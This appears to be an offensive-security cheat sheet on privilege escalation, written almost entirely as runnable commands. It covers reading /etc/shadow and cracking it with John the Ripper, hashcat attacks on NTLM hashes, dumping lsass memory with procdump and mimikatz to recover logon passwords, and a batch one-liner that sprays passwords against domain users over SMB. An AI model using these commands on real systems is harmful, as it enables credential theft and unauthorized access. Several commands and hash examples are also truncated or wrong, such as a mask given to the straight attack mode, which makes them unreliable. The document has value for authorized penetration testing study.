==## 4 - PRIVESC ##==

--# misconfig systems - nix #--
sudo -l #what access? if you have access to debuggers ex /usr/bin/gdb - sudo gdb && shell - it couldn't be that easy
sudo su #it couldn't be that easy


-----------# JOHN - NIX #-----------

copy /etc/shadow, /etc/passwd
chown /etc/shadow
unshadow passwd shadow > newfilename #unshadow is a jtr utility
unshadow /etc/passwd /etc/shadow > combinedpw #another way to merge
cat newfilename | awk -F: '{print $2'}  #use : as delimiter; print second field ($2) which is the password hash for linux systems
john newfilename #run on combined unshadowed file; will do default john cracking actions, stepping through each method;
#single, wordlist, then incremental
john newfilename --show #show already cracked results; will not show if file has already been cracked otherwise
john --list=formats
<newfilename> --show=left --format=md5crypt (etc)
<newfilename> --show - how many total have been cracked?
john --format=descrypt #DES hashes
john --format=<type, see list with list=formats>
john --format=descrypt --single #single crack mode; uses variation of account name, passwd acct info, etc
-wordlist filename #use filename as wordlist to dict attack; hybrid with single
-incremental #brute force

-----------# HASHC #-----------
look for hashes that do not have these two patterns: aadb:dcfed
=LANMAN hashes=
aad[#]b - A A D B - indicates this is an empty LANMAN hash - not active account  eg Admin:500:aad3b435b510413eeeeaadb
#mnemonic device - All Active Directory (is) Bad

NT hashes - D C F E D - 21d5cfe0d - indicates this is an empty NT hash - not active account - eg Admin:500:aad3b435b510413eeeeaabetc:21d5cfe0d
#mnemonic device - Dumb Crypto Fucks Everything Disastrously

#hashcat - first need to identify hash mode needed
NTLM mode -m 1000
hashcat -m 1000 -a 0 hashes.txt words.txt
#use m 1000 - NTLM use 0 straight attack read from hashes.txt file use words.txt as dict file
#use --show argument to show which hashes are associated with password cracked
hashcat -m 1000 -a 0 hashes.txt words.txt --show

hashcat -a 0 #dictionary attack
hashcat -a 1 #diciontary combinator, append each word to every other word using 2 files or 1 file twice
hashcat -a 3 #brute force mask attack using specified patterns
hashcat -a 6 #combined hybrid wordlist + mask, append mask to wordlist words
hashcat -a 7 #6 but pre-pend word

hashcat -a 3 #mask attack; use syntax
?l - lower
?u - upper
?d - digits
?s - special
?a - all above
hashcat -m 1000 -a 0 hashes.txt ?u?l?l?l?l?l?d?d #8 char pw, starts with upper, 5 lowercase in middle, 2 digits
hashcat -m 1000 -a 6 hashes.txt words.txt ?s?d  #take wordlist file and add mask to end ?s?d = specialchar, digit
hashcat -m 1000 -a 7 hashes.txt ?s?d? words.txt  #take wordlist and prepend mask

hashcat can also use rules to apply permutations;
hashcat -m 1000 -a 0 hash.txt words.txt -r best64.rule  #64 permutations of words in wordlsit


--------# MKATX #--------
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
mk.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full

#can also dump from 3rd party program that stores pw
.\procdump.exe -accepteula -ma <program>.exe <dump>.dmp
strings <dump>.dmp | grep -iE "auth|login|pass|key|secret|token|"

--# SMB PW GUESSING #--
#low complexity pass guess attack for SMB on Windows
#works well with large list of users and short list of common pws
net user /domain > listusers.txt
@FOR /F %p in (passw.txt) DO @FOR /F %n in (listusers.txt) DO @net use \\<SERVERIP>\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\SERVERIP\IPC$ > NUL
